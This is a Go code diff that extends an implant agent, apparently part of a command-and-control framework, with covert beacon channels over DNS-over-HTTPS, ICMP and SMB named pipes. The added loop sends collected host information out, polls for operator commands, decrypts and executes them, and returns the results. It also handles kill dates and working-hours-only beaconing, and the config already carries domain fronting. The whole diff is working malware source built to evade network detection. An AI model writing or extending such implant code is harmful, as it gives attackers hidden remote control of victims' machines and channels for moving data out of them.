@@ -48,6 +48,16 @@ type AgentConfig struct {
 	// Domain fronting — overrides the HTTP Host header while the TCP connection
 	// still goes to ServerURL (the CDN front). Empty = no fronting.
 	FrontDomain string
+
+	// Alternative transport.  "http" (default) uses standard HTTP beaconing.
+	// "doh"  — DNS-over-HTTPS via DoH resolver (pkg/transport/doh.go)
+	// "icmp" — ICMP echo request/reply       (pkg/transport/icmp_windows.go)
+	// "smb"  — SMB named pipe via relay      (pkg/transport/smb_windows.go)
+	Transport   string
+	DOHDomain   string // required when Transport=="doh"
+	DOHProvider string // "cloudflare" | "google"
+	SMBRelay    string // relay hostname/IP, required when Transport=="smb"
+	SMBPipe     string // named pipe name on relay, default "svcctl"
 }
 
 // Agent is the main implant runtime
@@ -325,11 +335,18 @@ func (a *Agent) sleep(d time.Duration) {
 	}
 }
 
-// Start runs the agent beacon loop
+// Start runs the agent beacon loop, dispatching to the configured transport.
 func (a *Agent) Start() error {
 	a.isRunning = true
-	fmt.Printf("[*] Agent %s starting — server: %s, interval: %ds ±%d%%\n",
-		a.ID, a.cfg.ServerURL, a.cfg.Interval, a.cfg.JitterPercent)
+	fmt.Printf("[*] Agent %s starting — transport: %s, interval: %ds ±%d%%\n",
+		a.ID, a.cfg.Transport, a.cfg.Interval, a.cfg.JitterPercent)
+
+	// Dispatch to alternative transport if configured
+	if t, err := a.newTransport(); err != nil {
+		return fmt.Errorf("transport init: %w", err)
+	} else if t != nil {
+		return a.startCovertLoop(t)
+	}
 
 	// Initial checkin with retries
 	for i := 0; i < a.cfg.MaxRetries; i++ {
@@ -394,6 +411,101 @@ func (a *Agent) Start() error {
 
 // Stop halts the beacon loop
 func (a *Agent) Stop() { a.isRunning = false }
+
+// newTransport returns the BeaconTransport for the configured transport type.
+// Returns nil when the transport is "http" (the default HTTP beacon loop is used).
+func (a *Agent) newTransport() (BeaconTransport, error) {
+	switch a.cfg.Transport {
+	case "doh":
+		if a.cfg.DOHDomain == "" {
+			return nil, fmt.Errorf("DoH transport requires DOHDomain to be set")
+		}
+		return newDoHTransport(a.cfg.DOHDomain, a.ID, a.cfg.DOHProvider), nil
+	case "icmp":
+		return newICMPTransport(a.cfg.ServerURL, a.ID)
+	case "smb":
+		if a.cfg.SMBRelay == "" {
+			return nil, fmt.Errorf("SMB transport requires SMBRelay to be set")
+		}
+		pipe := a.cfg.SMBPipe
+		if pipe == "" {
+			pipe = "svcctl"
+		}
+		return newSMBTransport(a.cfg.SMBRelay, pipe, a.ID)
+	default:
+		return nil, nil // use standard HTTP loop
+	}
+}
+
+// startCovertLoop runs the beacon loop using an alternative transport.
+// It mirrors the timing and kill-date logic of Start() but uses t.SendData /
+// t.PollCommand instead of HTTP.
+func (a *Agent) startCovertLoop(t BeaconTransport) error {
+	// Initial registration — send agent info via covert channel
+	info := a.CollectInfo()
+	payload, err := a.marshalPayload(info)
+	if err != nil {
+		return fmt.Errorf("marshal checkin: %w", err)
+	}
+	for i := 0; i < a.cfg.MaxRetries; i++ {
+		if err := t.SendData(payload); err != nil {
+			fmt.Printf("[!] Covert checkin attempt %d/%d: %v\n", i+1, a.cfg.MaxRetries, err)
+			if i == a.cfg.MaxRetries-1 {
+				return fmt.Errorf("covert checkin failed after %d attempts", a.cfg.MaxRetries)
+			}
+			a.sleep(10 * time.Second)
+		} else {
+			fmt.Printf("[+] Covert checkin OK (%s)\n", a.cfg.Transport)
+			break
+		}
+	}
+
+	for a.isRunning {
+		if a.cfg.KillDate != "" {
+			if kd, err := time.Parse("2006-01-02", a.cfg.KillDate); err == nil && time.Now().After(kd) {
+				fmt.Printf("[*] Kill date reached — exiting\n")
+				return nil
+			}
+		}
+		if a.cfg.WorkingHoursOnly && a.cfg.WorkingHoursStart < a.cfg.WorkingHoursEnd {
+			now := time.Now()
+			h := now.Hour()
+			if h < a.cfg.WorkingHoursStart || h >= a.cfg.WorkingHoursEnd {
+				next := time.Date(now.Year(), now.Month(), now.Day(),
+					a.cfg.WorkingHoursStart, 0, 0, 0, now.Location())
+				if !now.Before(next) {
+					next = next.Add(24 * time.Hour)
+				}
+				a.sleep(time.Until(next))
+				continue
+			}
+		}
+
+		raw, err := t.PollCommand()
+		if err != nil {
+			fmt.Printf("[!] Covert poll: %v\n", err)
+		} else if raw != nil {
+			// Decrypt if needed
+			var cmd types.Command
+			if a.activeCrypto() != nil {
+				dec, err := a.activeCrypto().DecryptData(string(raw))
+				if err == nil {
+					raw = dec
+				}
+			}
+			if err := json.Unmarshal(raw, &cmd); err == nil && cmd.ID != "" {
+				result := ExecuteCommand(a, &cmd)
+				if rb, err := a.marshalPayload(result); err == nil {
+					if err := t.SendData(rb); err != nil {
+						fmt.Printf("[!] Covert send result: %v\n", err)
+					}
+				}
+			}
+		}
+		a.sleep(a.beaconInterval())
+	}
+	return nil
+}
 
 // ── private helpers ───────────────────────────────────────────────────────────
 
